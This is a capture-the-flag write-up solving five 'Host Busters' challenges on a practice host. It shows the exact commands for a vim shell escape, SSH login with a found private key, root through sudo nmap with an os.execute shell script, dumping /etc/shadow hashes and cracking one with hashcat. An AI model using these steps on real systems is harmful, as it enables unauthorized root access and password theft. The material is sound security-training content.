# Host Busters

## Host Busters 1

Created by: **syyntax**

Turbo Tactical has gained access to a DEADFACE machine that belongs to  `gh0st404`. This machine was used to scan one of TGRI’s websites. See if you can find anything useful in the  `vim`  user’s directory.

_On a side note, it’s also a good idea to collect anything you think might be useful in the future for going after DEADFACE._

Submit the flag as  `flag{flag_here}`.

`vim@gh0st404.deadface.io`

Password:  `letmevim`

### Solution

You're given an ssh host, after logging in you're automatically placed into vim. There's 3 ways (which I found) to solve the challenge.

1. Be a chad Vim user D:   `:E` -> To exit file and go to directory view, go up a directory, go to `vim` home, open flag file.
2. Type `:ter` to open subterminal and same as above.
3. Type `:shell` to gain fully interactive shell, defaults to /bin/sh, type `bash` to switch to bash.

```powershell
➜ ssh vim@gh0st404.deadface.io
...
Type: `:shell`
$ ls
hostbusters1.txt
$ cat ho*
flag{esc4P3_fr0m_th3_V1M}
```
::: tip Flag
`flag{esc4P3_fr0m_th3_V1M}`
:::

## Host Busters 2 

Created by: **syyntax**

Now that you’ve escaped out of  `vim`, scope out and characterize the machine. See if there are any other flags you can find without having to escalate to another user. 

### Solution

Probably the trickiest of all, there should be a flag somewhere but without escalating to other user. 

`sudo -l` came empty handed.

```bash
vim@7ee9ba1f9007:~$ sudo -l
Matching Defaults entries for vim on 7ee9ba1f9007:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User vim may run the following commands on 7ee9ba1f9007:
    (ALL : ALL) NOPASSWD: /etc/init.d/ssh start
```

No interesting processes
```bash
vim@7ee9ba1f9007:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
vim            1  0.0  0.0   2576   888 pts/0    Ss   21:09   0:00 /bin/sh /usr/bin/start
vim            8  0.0  0.0   1036   744 pts/0    S    21:09   0:00 /usr/bin/srv
vim            9  0.2  0.0  11692  9000 pts/0    Sl   21:09   0:00 /bin/vim /home/gh0st404/config
vim           11  0.0  0.0   2576   904 pts/0    S    21:09   0:00 sh
vim           12  0.0  0.0   4188  3528 pts/0    S    21:09   0:00 bash
root          21  0.0  0.0  15404  3412 ?        Ss   21:09   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
vim           28  0.0  0.0   8088  3936 pts/0    R+   21:09   0:00 ps aux
```

gh0st404 had some files which had nmap scans of website, so I thought some port might be open. `nmap` was taking ages so I just checked for `netstat`.

```bash
vim@7ee9ba1f9007:~$ netstat -a
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp6       0      0 [::]:22                 [::]:*                  LISTEN
udp        0      0 0.0.0.0:9023            0.0.0.0:*
```

A weird connection, lets try connecting.

```bash
# Dont forget `-u` for UDP!
vim@7ee9ba1f9007:~$ nc -u localhost 9023 
# Hit enter to get response
flag{Hunt_4_UDP_s3rv3r}
```::: tip Flag
`flag{Hunt_4_UDP_s3rv3r}`
:::

## Host Busters 3 

Created by: **syyntax**

Continue characterizing the machine. Is there any way you can escalate to a user that has permissions the  `vim`  user does not have? Find the flag associated with this user. 

### Solution

`hostbusters3.txt` can be found in the directory of user `gh0st404`, but we dont have permission to read the file, only the author. `gh0st404` has left an interesting file: id_rsa, we can use this private key to login using ssh without password since private key takes care of it.

```bash
vim@7ee9ba1f9007:/home/gh0st404$ ls -alh
total 60K
drwxrwxr-x 1 gh0st404 gh0st404 4.0K Jul 31 02:24 .
drwxrwxr-x 1 root     root     4.0K Jul 29 23:05 ..
-rw------- 1 gh0st404 gh0st404  214 Jul 29 23:02 .bash_history
-rw-r--r-- 1 gh0st404 gh0st404  220 Apr 23 21:23 .bash_logout
-rw-r--r-- 1 gh0st404 gh0st404 3.5K Apr 23 21:23 .bashrc
drwxrwxr-x 1 gh0st404 gh0st404 4.0K Jul 29 23:05 .keys
-rw-r--r-- 1 gh0st404 gh0st404  807 Apr 23 21:23 .profile
drwx------ 1 gh0st404 gh0st404 4.0K Jul 29 23:05 .ssh
-rw-rw-r-- 1 gh0st404 gh0st404   47 Jul 29 23:05 config
-rw------- 1 gh0st404 gh0st404   34 Jul 29 23:05 hostbusters3.txt
-rw-rw-r-- 1 gh0st404 gh0st404 2.6K Jul 29 23:05 id_rsa
-rw-r--r-- 1 gh0st404 gh0st404  958 Jul 29 23:05 tgri-alive.xml
-rw-r--r-- 1 gh0st404 gh0st404  12K Jul 29 23:05 tgri-scan.xml
vim@7ee9ba1f9007:/home/gh0st404$ ssh localhost -l gh0st404 -i id_rsa
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
gh0st404@7ee9ba1f9007:~$ cat hostbusters3.txt
flag{Embr4c3_th3_K3y_t0_5ucc355!}
```
::: tip Flag
`flag{Embr4c3_th3_K3y_t0_5ucc355!}`
:::

## Host Busters 4 

Created by: **syyntax**

TGRI believes a sensitive project proposal was compromised in a recent attack from DEADFACE. Find the proposal and submit the flag associated with this document. 

### Solution

`gh0st404` has an interesting permission, no sudo on nmap -> [GTFOBins nmap](https://gtfobins.github.io/gtfobins/nmap/)

```bash
gh0st404@7ee9ba1f9007:~$ sudo -l
Matching Defaults entries for gh0st404 on 7ee9ba1f9007:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User gh0st404 may run the following commands on 7ee9ba1f9007:
    (ALL) NOPASSWD: /usr/bin/nmap
    (ALL : ALL) NOPASSWD: /etc/init.d/ssh start
```

If you noticed `spookyboi` had some pdf in his directory, lets try seeing it.

```bash
gh0st404@7ee9ba1f9007:~$ TF=/tmp/letmein
gh0st404@7ee9ba1f9007:~$ echo 'os.execute("/bin/sh")' > $TF
gh0st404@7ee9ba1f9007:~$ sudo nmap --script=$TF
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-22 21:26 UTC
NSE: Warning: Loading '/tmp/letmein' -- the recommended file extension is '.nse'.
# root # <-- whoami # Shell kinda wacky...
# cd /home/sp*
# cat pro*
...
startxref
116
%%EOF
SG9zdCBCdXN0ZXJzIDQ6IGZsYWd7QWJ1czNfb0ZfcDB3M1J9Cg==
# exit
gh0st404@7ee9ba1f9007:~$ echo 'SG9zdCBCdXN0ZXJzIDQ6IGZsYWd7QWJ1czNfb0ZfcDB3M1J9Cg==' | base64 -d
Host Busters 4: flag{Abus3_oF_p0w3R}
```
::: tip Flag
`flag{Abus3_oF_p0w3R}`
:::

## Host Busters 5
 
Created by: **syyntax**

See if you can crack  `gh0st404`’s password. Based on Ghost Town conversations, we suspect the password is found in common wordlists. 

### Solution

User passwords in linux systems are stored in `/etc/shadow` and common wordlist for passwords is `rockyou.txt`

Gain root shell from `nmap` and read shadow.

```bash
# cat /etc/shadow
...
mort1cia:$6$53820c565eca77b2$WVK13lCDwtn1/DjcyCktOFkZBb8GX/s0N.lHv8nqRTdIcUFaN6UR1t2iadYXU7bR0DD8P3.JzNcW.ne5vgDfO.:19568:0:99999:7:::
spookyboi:$6$238114ed7adfd724$8mKfFn9ywaU8SV0iQxgi/b8PRA.17ZCU77A9uwQzag/pTYMRbdKVADKoB7EWbU539xg.vy1ZP21Sy.B1WIKvA0:19568:0:99999:7:::
vim:$6$d782b019e05a0a3f$0BP3fPEfLmd7P2WPrXlghsdLH.goxQwvxAyvkDbSYuqidXWhlgtT5f.HXpM1cx8KdgUyfOzDZw2G9O5CoucVL0:19568:0:99999:7:::
gh0st404:$6$5d63619132db26f0$4FF5/xxtU1.OPzv2OdnWmB0mG5kqyMGUCAW8crE5ZqS24v6i1sM806eh8SigsZLxeJs/EtK0RJuB.eD.wTjLp/:19568:0:99999:7:::
```

Start cracking

```bash
└─$ echo '$6$5d63619132db26f0$4FF5/xxtU1.OPzv2OdnWmB0mG5kqyMGUCAW8crE5ZqS24v6i1sM806eh8SigsZLxeJs/EtK0RJuB.eD.wTjLp/' > hash

└─$ hashcat --show hash
...
1800 | sha512crypt $6$, SHA512 (Unix) | Operating System
...

└─$ hashcat -m 1800 -a 0 hash $rockyou # <- rockyou.txt 
...

└─$ hashcat --show hash               
...
$6$5d63619132db26f0$4FF5/xxtU1.OPzv2OdnWmB0mG5kqyMGUCAW8crE5ZqS24v6i1sM806eh8SigsZLxeJs/EtK0RJuB.eD.wTjLp/:zaq12wsx
...
```
::: tip Flag
`flag{zaq12wsx}`
:::